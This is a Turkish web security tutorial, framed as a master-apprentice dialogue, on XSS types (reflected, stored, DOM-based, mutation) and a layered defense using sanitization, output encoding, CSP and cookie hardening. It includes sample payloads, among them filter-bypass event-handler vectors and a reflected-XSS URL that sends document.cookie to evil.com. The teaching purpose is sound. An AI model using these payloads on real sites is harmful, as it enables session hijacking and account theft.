# Gün 160: XSS Türleri ve Çok Katmanlı Savunma Derinliği

## Usta-Çırak Başlangıç Hasbihali
**Usta:** Evlat, web güvenliği dünyasında en çok küçümsenen ancak en yıkıcı sonuçlara yol açan zafiyetlerin başında XSS (Cross-Site Scripting - CWE-79) gelir. Acemi geliştiriciler XSS'i sadece ekranda beliren masum bir `alert(1)` kutucuğundan ibaret sanır. Oysa gerçek bir saldırgan için XSS, kurbanın tarayıcısında tam yetkili bir JavaScript kabuğu (shell) açmak demektir. Kurbanın oturum çerezlerini çalabilir, kurban adına banka transferi yapabilir, şifre sıfırlama istekleri gönderebilir veya web kamerasını dinlemeye kalkışabilir.

**Çırak:** Ustam, girdi doğrulama yapıp `<script>` etiketlerini filtrelesek XSS'i kökten çözmüş olmaz mıyız?

**Usta:** Ah evlat! İşte en büyük yanılgı budur: "Kara liste (blacklist) filtresi ile güvenlik sağlama yanılsaması." Saldırgan `<img src=x onerror=alert(1)>` yazar, filtreyi deler. `<svg onload=alert(1)>` yazar, yine deler. Hatta hiç sunucuya uğramadan doğrudan tarayıcının belleğinde `location.hash` üzerinden `element.innerHTML` havuzuna akar. İşte buna DOM-based XSS denir. Bugün seninle XSS'in tüm anatomisini, Reflected, Stored, DOM-based ve mXSS (Mutation XSS) türlerini ve bunlara karşı kurumsal düzeyde aşılmaz bir savunma hattı kurmayı öğreneceğiz.

---

## 1. XSS Saldırı Türlerinin Anatomisi

```
+----------------------------------------------------------------------------------+
|                            XSS SALDIRI ANATOMİSİ                                |
+----------------------------------------------------------------------------------+
| 1. Reflected XSS   : İstek (URL/Form) -> Sunucu -> Anında HTTP Yanıtı             |
| 2. Stored XSS      : İstek -> Veritabanı/Disk -> Diğer Kullanıcıların Sayfaları   |
| 3. DOM-based XSS   : Kaynak (Source) -> İstemci JS -> Tehlikeli Havuz (Sink)     |
| 4. Mutation XSS    : Tarayıcı DOM Parser Mutasyonu -> Zararsız Kodun Zararlı Olması|
+----------------------------------------------------------------------------------+
```

### 1.1 Reflected (Yansıyan) XSS
- **Mekanizma:** Kullanıcıdan gelen parametre (örneğin arama kutusu `?q=...` veya hata mesajı) sunucu tarafından kalıcı olarak saklanmadan doğrudan üretilen HTML sayfasına basılır.
- **Vektör:** Saldırgan kurbana özel hazırlanmış bir oltalama (phishing) bağlantısı tıkalatır:
  ```
  https://banka.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
  ```
- **Karakteristik:** Kalıcı değildir, kurbanın bağlantıya bizzat tıklaması veya saldırganın yönlendirmesine maruz kalması gerekir.

### 1.2 Stored (Kalıcı / Depolanan) XSS
- **Mekanizma:** En tehlikeli ve bulaşıcı XSS türüdür. Saldırgan zararlı betiği bir foruma, blog yorumuna, kullanıcı profil adına veya müşteri destek biletine enjekte eder.
- **Depolama:** Betik sunucunun veritabanında kalıcı olarak saklanır.
- **Tetiklenme:** Sayfayı ziyaret eden her bir masum kullanıcı (veya yönetim panelini açan bir sistem yöneticisi) zararlı kodu otomatik olarak çalıştırır.
- **Blind XSS:** Saldırganın enjekte ettiği yükün saatler veya günler sonra şirket içi arka ofis (back-office) veya CRM panellerinde tetiklenmesi durumudur.

### 1.3 DOM-based (Belge Nesne Modeli Tabanlı) XSS
- **Mekanizma:** Sunucu tarafında hiçbir güvenlik açığı olmasa dahi meydana gelebilir. Hatta sunucu gelen veriyi hiç HTML içinde yansıtmayabilir.
- **İstemci Tarafı Akışı:** Zafiyet, tarayıcıda çalışan JavaScript kodunun güvensiz bir kaynaktan (Source) okuduğu veriyi doğrudan tarayıcı DOM'unu değiştiren tehlikeli bir havuza (Sink) aktarmasıyla oluşur.
- **Sources (Girdi Kaynakları):**
  - `location.search`, `location.hash`, `location.href`
  - `document.referrer`
  - `window.name`
  - `document.cookie`, `localStorage`, `sessionStorage`
  - `window.postMessage` dinleyicileri
- **Sinks (Yürütücü Havuzlar):**
  - `element.innerHTML`, `element.outerHTML`
  - `document.write()`, `document.writeln()`
  - `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function()`
  - `location.href = ...` (eğer `javascript:` protokolüyle birleşirse)

### 1.4 Mutation XSS (mXSS) ve DOM Clobbering
- **mXSS:** Web uygulaması zengin metin düzenleyicilerinde (Rich Text Editor) kullanıcı girdisini HTML parser ile temizlediğini sanır. Ancak tarayıcının HTML5 DOM parser'ı geçersiz veya garip hiyerarşideki etiketleri düzeltmeye (mutasyona uğratmaya) çalışırken gizlenmiş olay dinleyicilerini tetikler.
- **DOM Clobbering:** HTML içerisinde `id` veya `name` niteliği taşıyan etiketler (`<form id="config">`, `<a id="apiEndpoint">`), tarayıcı tarafından global `window` veya `document` nesnelerinin üzerine yazılır. Eğer uygulamanın JavaScript betiği `window.config.url` gibi bir değişkene güveniyorsa, saldırgan HTML enjeksiyonu ile JS akışını ele geçirebilir.

---

## 2. Kurumsal Çok Katmanlı Savunma Mimarisi (Defense-in-Depth)

Bir web uygulamasını XSS'e karşı korurken tek bir tedbire bel bağlamak ölümcül bir hatadır. Endüstri standardı 4 katmanlı savunma stratejisi gerektirir:

### Katman 1: Katı Allowlist Tabanlı HTML Arındırma (Sanitization)
Kullanıcının kalın yazı (`<b>`), italik (`<i>`) veya bağlantı (`<a>`) gibi güvenli HTML etiketleri girmesine izin verilmesi gereken durumlarda (Markdown render, WYSIWYG editörleri), açık kaynaklı ve denetlenmiş katı allowlist kütüphaneleri (ör. `DOMPurify`) kullanılmalıdır.
- Tüm `on*` nitelikleri (`onclick`, `onerror`, `onload`) ayıklanmalıdır.
- `href` niteliklerinde yalnızca `http://`, `https://` ve `mailto:` şemalarına izin verilmeli, `javascript:` veya `data:` engellenmelidir.
- `<script>`, `<iframe>`, `<object>`, `<embed>`, `<base>` etiketleri kökten yok edilmelidir.

### Katman 2: Bağlama Duyarlı Çıktı Kodlama (Context-Aware Encoding)
Verinin HTML belgesinde yerleştirildiği konuma göre doğru kodlama algoritması seçilmelidir:
1. **HTML Gövdesi (Body):** `&` -> `&amp;`, `<` -> `&lt;`, `>` -> `&gt;`, `"` -> `&quot;`, `'` -> `&#x27;`.
2. **HTML Nitelikleri (Attributes):** `<input value="BURAYA">` içine yazılacak verilerde tüm alfanümerik olmayan karakterler onaltılık HTML varlıklarına (`&#xHH;`) dönüştürülmelidir.
3. **JavaScript Değişkenleri:** `<script>let user = "BURAYA";</script>` içine gömülen verilerde Unicode kaçış dizileri (`\uXXXX`) kullanılmalıdır. Asla doğrudan dize birleştirme yapılmamalı, veri JSON olarak (`json.dumps()`) güvenli serileştirilmelidir.
4. **URL Parametreleri:** `href="/search?q=BURAYA"` için RFC 3986 percent-encoding uygulanmalıdır.

### Katman 3: Content Security Policy (CSP Seviye 3)
CSP, tarayıcı seviyesinde çalışan en güçlü ikinci savunma hattıdır. Bir XSS açığı bulunsa dahi, tarayıcının yetkisiz betikleri çalıştırmasını veya veri sızdırmasını engeller.
- **Kriptografik Nonce Kullanımı:** Her HTTP isteğinde sunucu tarafında 128-bitlik CSPRNG rastgele tek kullanımlık bir token (`nonce`) üretilir ve hem HTTP başlığına hem de meşru inline betiklere eklenir:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'nonce-rAnd0m128b1t' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; require-trusted-types-for 'script';
  ```
- **Neden `'unsafe-inline'` ve `'unsafe-eval'` Yasaktır?** Çünkü bu direktifler XSS saldırganının `<script>alert(1)</script>` veya `eval()` çalıştırmasını serbest bırakır.

### Katman 4: Çerez Sertleştirme (HttpOnly ve SameSite)
- XSS'in en yaygın saldırı hedefi oturum çerezleridir (Session Hijacking).
- Oturum çerezlerine `HttpOnly` bayrağı eklendiğinde, kurbanın tarayıcısında çalışan hiçbir JavaScript kodu `document.cookie` üzerinden oturum kimliğini okuyamaz.
- `SameSite=Strict` veya `Lax` bayrağı ile birleştiğinde XSS kaynaklı CSRF saldırıları da engellenmiş olur.

---

## Usta Öğüdü ve Altın Kurallar
1. **"Girdi Doğrulama XSS'i Çözmez, Çıktı Kodlama Çözer":** Girdide `O'Reilly` gibi meşru bir isim bulunabilir. Bu isim veritabanına aynen yazılmalı, ancak ekrana basılırken bağlama uygun şekilde kodlanmalıdır.
2. **"Asla Kendi HTML Sanitizer'ını Yazma":** HTML5 spesifikasyonu binlerce kenar durum (edge case) içerir. Üretim ortamlarında her zaman `DOMPurify` gibi bağımsız güvenlik uzmanlarınca test edilmiş motorları kullan.
3. **"DOM Sinks'lerden Kaçın":** Modern frontend mimarisinde (React, Vue, Angular) doğrudan `innerHTML` kullanmak yerine çerçevenin sağladığı güvenli veri bağlama (`textContent` veya JSX) mekanizmalarını tercih et.
